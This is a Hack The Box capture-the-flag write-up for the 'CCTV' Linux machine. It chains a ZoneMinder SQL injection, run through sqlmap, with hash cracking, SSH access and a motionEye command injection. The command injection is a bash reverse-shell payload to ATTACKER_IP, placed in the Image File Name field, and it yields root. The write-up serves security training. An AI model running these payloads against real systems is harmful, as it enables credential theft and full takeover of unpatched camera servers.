# HTB-CCTV
A writeup about Hack The Box CCTV machine
| Field      | Value      |
| ---------- | ---------- |
| Name       | CCTV       |
| OS         | Linux      |
| Difficulty | Easy       |
| Platform   | HackTheBox |

This machine involves exploiting vulnerabilities in ZoneMinder and motionEye to obtain a root shell.

# AttackPath
The attack path consists of:

1. Enumeration of web services
2. SQL injection in ZoneMinder
3. Credential extraction and SSH access
4. Discovery of an internal motionEye service
5. Command injection leading to root privilege escalation

# 1. Enumeration
## Port Scan
Initial enumeration with nmap:

`nmap -p- --min-rate 5000 -sS 10.129.X.X`

Results:

`22/tcp open ssh`

`80/tcp open http`

Only two ports are exposed.

Add the host entry:

`echo "10.129.X.X cctv.htb" | sudo tee -a /etc/hosts`

## Web Enumeration

Browsing to:

`http://cctv.htb/zm/`

reveals a login page for ZoneMinder.

Default credentials works:

`admin : admin`

# 2. SQL INJECTION (CVE-2024-51482)

ZoneMinder contains a blind SQL injection vulnerability in the parameter:

`/zm/index.php?view=request&request=event&action=removetag&tid=<payload>`

The vulnerability is tracked as:

**CVE-2024-51482**

After logging in, the session cookie ZMSESSID was captured.

The injection was exploited with sqlmap.

`sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm -T Users -C Username,Password \
--dump \
--batch \
--dbms=MySQL \
--technique=T \
--cookie="ZMSESSID=<SESSION>" \
--time-sec=2`

Dumped credentials included:

`mark | $2y$10$....`

# 3. Password Cracking

The bcrypt hash was cracked using `hashcat`.

`hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`

Recovered credentials:

`mark : opensesame`

# 4. Initial Access

SSH access was obtained:

`ssh mark@cctv.htb`

Password:

`opensesame`

# 5. Internal Service Enumeration

Checking local listening services:

`ss -tlnp`

| Address      | Port     |Service |
| ---------- | ---------- |----------
| 127.0.0.1  | 8765      | Motioneye
| 127.0.0.1  | 7999      | MotionHTTP
| 127.0.0.1  | 9081     | MJPEG Stream

The service on 8765 is motionEye running locally.

# 6. Port Forwarding

To access the service externally:

`ssh -L 8765:127.0.0.1:8765 mark@cctv.htb`

The web interface becomes accessible at:

`http://127.0.0.1:8765`

# 7. Privilege Escalation

The installed version of motionEye is vulnerable to command injection via an unsanitized configuration parameter.

This vulnerability is tracked as:

**CVE-2025-60787**

User input in the Image File Name field is written directly into the Motion configuration file. When Motion reloads the configuration, the value is interpreted by the shell, allowing command execution.

## Credit

The exploitation technique for this vulnerability is based on research from:

`https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter`

## Start Listener

`nc -lvnp 4444`

## Inject Reverse Shell

Navigate to:

`Camera Settings → Still Images`

Set:

`Capture Mode: Interval Snapshots`

`Interval: 10`

Image File Name payload:

`$(bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1").%Y-%m-%d`

Click Apply.

Within a few seconds, a reverse shell is received.

# 8. Root Shell

The listener receives a shell:

`root@cctv:/etc/motioneye#`

Verification:

`id`

Output:

`uid=0(root) gid=0(root)`

# 9. Flags

User flag:

`/home/sa_mark/user.txt`

Root flag:

`/root/root.txt`

Retrieve:

`cat /home/sa_mark/user.txt`

`cat /root/root.txt`


# Attack Chain Summary

1. Enumerated services with nmap
2. Logged into ZoneMinder using default credentials
3. Exploited SQL injection (CVE‑2024‑51482)
4. Extracted and cracked database credentials
5. SSH access as mark
6. Discovered internal motionEye service
7. Port‑forwarded the service
8. Exploited command injection (CVE‑2025‑60787)
9. Obtained a root reverse shell

# Tools Used

| Tool    | Purpose                         |
| ------- | ------------------------------- |
| nmap    | Port scanning                   |
| sqlmap  | SQL injection exploitation      |
| hashcat/Burpsuite | Password cracking               |
| ssh     | Remote access & port forwarding |
| netcat  | Reverse shell listener          |

